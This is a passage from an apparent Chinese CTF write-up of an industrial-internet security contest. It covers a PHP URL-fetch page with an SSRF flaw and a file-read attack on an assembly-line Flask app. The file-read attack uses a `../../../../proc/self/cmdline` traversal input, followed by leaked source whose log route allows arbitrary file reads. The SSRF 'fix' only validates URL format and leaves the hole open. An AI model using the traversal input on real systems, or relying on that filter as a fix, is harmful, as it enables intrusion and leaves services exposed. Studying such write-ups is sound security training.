punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.btn:hover</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #45a049<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.error</span> <span class="token punctuation">&#123;</span>            <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.result</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f1f1f1<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">word-wrap</span><span class="token punctuation">:</span> break-word<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>危化品处理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请输入 URL：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入有效的 URL<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交处理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- 显示错误消息 --></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>请求结果:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>指出代码存在漏洞的行数：一眼在12行<code>$response = curl_exec($ch);</code>这里可以随便ssrf</p></li><li><p>如果要对代码进行修复，应该做出怎样修改：简单过滤一手</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(https?|ftp):\/\/.[^\s]*$/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"无效的 URL，请检查格式。"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_MAXREDIRS</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$response</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cURL 错误: '</span> <span class="token operator">.</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr><h1 id="渗透-数字化装配场景"><a href="#渗透-数字化装配场景" class="headerlink" title="渗透-数字化装配场景"></a>渗透-数字化装配场景</h1><p>日志处存在任意文件读取，甚至可以列出目录</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128140416081.png" alt="image-20241128140416081"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/proc/self/cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128140838919.png" alt="image-20241128140838919"></p><p>读取的日志有最大长度</p><p>..&#x2F;data_monitor.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""opc-ua类: 实现工业机器交互opc-ua安装使用方式：pip install opcuaopencv-python"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> tempfile<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">import</span> json<span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">from</span> itertools <span class="token keyword">import</span> islice<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS<span class="token keyword">from</span> opcua <span class="token keyword">import</span> Client<span class="token punctuation">,</span> ua<span class="token punctuation">,</span> Node<span class="token keyword">import</span> cv2<span class="token keyword">from</span> base_info <span class="token keyword">import</span> sub_ids<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token keyword">from</span> get_generate_plan <span class="token keyword">import</span> get_random_plan<span class="token keyword">from</span> update_value <span class="token keyword">import</span> monitor_task<span class="token keyword">from</span> mysql_db <span class="token keyword">import</span> MySQLDatabaseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">,</span> resources<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">r"/*"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"origins"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>abs_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>abs_path<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_monitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> MySQLDatabase<span class="token punctuation">(</span>host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token punctuation">)</span> <span class="token keyword">as</span> db<span class="token punctuation">:</span>            data <span class="token operator">=</span> db<span class="token punctuation">.</span>execute_query<span class="token punctuation">(</span><span class="token string">"SELECT name_key, content FROM monitor"</span><span class="token punctuation">,</span><span class="token punctuation">)</span>            info <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> info<span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/plan"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_plan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        plan_list <span class="token operator">=</span> get_random_plan<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> plan_list<span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_log"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    file_path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>abs_path<span class="token punctuation">&#125;</span></span><span class="token string">/log/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                lines <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>islice<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span>delete<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> temp_file<span class="token punctuation">:</span>                temp_file<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>                temp_file_path <span class="token operator">=</span> temp_file<span class="token punctuation">.</span>name            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>send_file<span class="token punctuation">(</span>temp_file_path<span class="token punctuation">)</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/json'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"文件不存在"</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>            json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>abs_path<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">VideoCamera</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> account<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"rtsp://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>account<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">@</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:554/Streaming/Channels/1"</span></span>        self<span class="token punctuation">.</span>video <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>isOpened<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_frame</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> image <span class="token operator">=</span> self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        ret<span class="token punctuation">,</span> jpeg <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> image<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jpeg<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;mysql_db.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector<span class="token keyword">class</span> <span class="token class-name">MySQLDatabase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>user <span class="token operator">=</span> user        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>database <span class="token operator">=</span> database        self<span class="token punctuation">.</span>conn <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>cursor <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>conn <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>            host<span class="token operator">=</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span>            user<span class="token operator">=</span>self<span class="token punctuation">.</span>user<span class="token punctuation">,</span>            password<span class="token operator">=</span>self<span class="token punctuation">.</span>password<span class="token punctuation">,</span>            database<span class="token operator">=</span>self<span class="token punctuation">.</span>database        <span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cursor <span class="token operator">=</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">execute_query</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> query<span class="token 